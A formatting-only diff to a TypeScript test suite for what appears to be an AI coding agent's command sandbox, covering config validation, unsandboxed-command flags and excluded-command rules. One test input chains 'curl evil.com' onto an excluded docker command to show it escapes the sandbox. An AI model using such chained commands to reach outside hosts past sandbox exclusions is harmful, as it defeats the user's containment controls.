@@ -67,8 +67,12 @@ describe("path pattern resolution", () => {
 
 describe("managed-domain policy gate", () => {
 	test("true only for an explicit policy allowManagedDomainsOnly flag", () => {
-		expect(shouldAllowManagedSandboxDomainsOnly({ sandbox: { network: { allowManagedDomainsOnly: true } } })).toBe(true);
-		expect(shouldAllowManagedSandboxDomainsOnly({ sandbox: { network: { allowManagedDomainsOnly: false } } })).toBe(false);
+		expect(shouldAllowManagedSandboxDomainsOnly({ sandbox: { network: { allowManagedDomainsOnly: true } } })).toBe(
+			true,
+		);
+		expect(shouldAllowManagedSandboxDomainsOnly({ sandbox: { network: { allowManagedDomainsOnly: false } } })).toBe(
+			false,
+		);
 		expect(shouldAllowManagedSandboxDomainsOnly({})).toBe(false);
 		expect(shouldAllowManagedSandboxDomainsOnly()).toBe(false);
 	});
@@ -183,12 +187,16 @@ describe("runtime config validation (zod schema replacement)", () => {
 	test("throws on malformed configs", () => {
 		expect(() => validateSandboxRuntimeConfig(null)).toThrow();
 		expect(() => validateSandboxRuntimeConfig("config")).toThrow();
-		expect(() => validateSandboxRuntimeConfig({ network: { allowedDomains: "github.com" } })).toThrow(/allowedDomains/);
+		expect(() => validateSandboxRuntimeConfig({ network: { allowedDomains: "github.com" } })).toThrow(
+			/allowedDomains/,
+		);
 		expect(() => validateSandboxRuntimeConfig({ network: { httpProxyPort: 99999 } })).toThrow(/httpProxyPort/);
 		expect(() => validateSandboxRuntimeConfig({ filesystem: { allowWrite: [42] } })).toThrow(/allowWrite/);
 		expect(() => validateSandboxRuntimeConfig({ ripgrep: { args: ["--files"] } })).toThrow(/ripgrep/);
 		expect(() => validateSandboxRuntimeConfig({ ignoreViolations: { git: "nope" } })).toThrow(/ignoreViolations/);
-		expect(() => validateSandboxRuntimeConfig({ enableWeakerNestedSandbox: "yes" })).toThrow(/enableWeakerNestedSandbox/);
+		expect(() => validateSandboxRuntimeConfig({ enableWeakerNestedSandbox: "yes" })).toThrow(
+			/enableWeakerNestedSandbox/,
+		);
 	});
 });
 
@@ -262,12 +270,17 @@ describe("shouldUseSandbox", () => {
 	test("dangerouslyDisableSandbox honours allowUnsandboxedCommands", () => {
 		expect(shouldUseSandbox({ command: "ls", dangerouslyDisableSandbox: true }, available)).toBe(false);
 		expect(
-			shouldUseSandbox({ command: "ls", dangerouslyDisableSandbox: true }, { ...available, allowUnsandboxedCommands: false }),
+			shouldUseSandbox(
+				{ command: "ls", dangerouslyDisableSandbox: true },
+				{ ...available, allowUnsandboxedCommands: false },
+			),
 		).toBe(true);
 	});
 
 	test("excluded commands opt out", () => {
-		expect(shouldUseSandbox({ command: "docker ps && curl evil.com" }, { ...available, excludedCommands: ["docker:*"] })).toBe(false);
+		expect(
+			shouldUseSandbox({ command: "docker ps && curl evil.com" }, { ...available, excludedCommands: ["docker:*"] }),
+		).toBe(false);
 		expect(shouldUseSandbox({ command: "ls" }, { ...available, excludedCommands: ["docker:*"] })).toBe(true);
 	});
 });
@@ -347,7 +360,10 @@ describe("auto-allow predicate for the decision engine", () => {
 		expect(disabled.canSandboxAutoAllow("bash", { command: "ls" })).toBe(false);
 		expect(disabled.shouldUseSandbox({ command: "ls" })).toBe(false);
 
-		const noAutoAllow = createSandboxAutoAllow({ enabled: true, autoAllowBashIfSandboxed: false }, { probe: () => true });
+		const noAutoAllow = createSandboxAutoAllow(
+			{ enabled: true, autoAllowBashIfSandboxed: false },
+			{ probe: () => true },
+		);
 		expect(noAutoAllow.canSandboxAutoAllow("bash", { command: "ls" })).toBe(false);
 
 		const unavailable = createSandboxAutoAllow({ enabled: true }, { probe: () => false });
@@ -358,12 +374,16 @@ describe("auto-allow predicate for the decision engine", () => {
 
 describe("addToExcludedCommands", () => {
 	test("uses the Bash rule prefix from suggestions, else the literal command", () => {
-		expect(resolveExcludedCommandPattern("npm run test:*", [{ type: "addRules", rules: [{ toolName: "Bash", ruleContent: "npm run test:*" }] }])).toBe(
-			"npm run test",
-		);
-		expect(resolveExcludedCommandPattern("npm run test", [{ type: "addRules", rules: [{ toolName: "Bash", ruleContent: "npm run test" }] }])).toBe(
-			"npm run test",
-		);
+		expect(
+			resolveExcludedCommandPattern("npm run test:*", [
+				{ type: "addRules", rules: [{ toolName: "Bash", ruleContent: "npm run test:*" }] },
+			]),
+		).toBe("npm run test");
+		expect(
+			resolveExcludedCommandPattern("npm run test", [
+				{ type: "addRules", rules: [{ toolName: "Bash", ruleContent: "npm run test" }] },
+			]),
+		).toBe("npm run test");
 		expect(resolveExcludedCommandPattern("docker ps")).toBe("docker ps");
 	});
 
@@ -372,9 +392,11 @@ describe("addToExcludedCommands", () => {
 		expect(manager.addToExcludedCommands("docker ps")).toBe("docker ps");
 		expect(manager.addToExcludedCommands("docker ps")).toBe("docker ps");
 		expect(manager.getExcludedCommands()).toEqual(["docker:*", "docker ps"]);
-		expect(manager.addToExcludedCommands("npm run test", [{ type: "addRules", rules: [{ toolName: "bash", ruleContent: "npm run test:*" }] }])).toBe(
-			"npm run test",
-		);
+		expect(
+			manager.addToExcludedCommands("npm run test", [
+				{ type: "addRules", rules: [{ toolName: "bash", ruleContent: "npm run test:*" }] },
+			]),
+		).toBe("npm run test");
 		expect(manager.getExcludedCommands()).toEqual(["docker:*", "docker ps", "npm run test"]);
 	});
 });
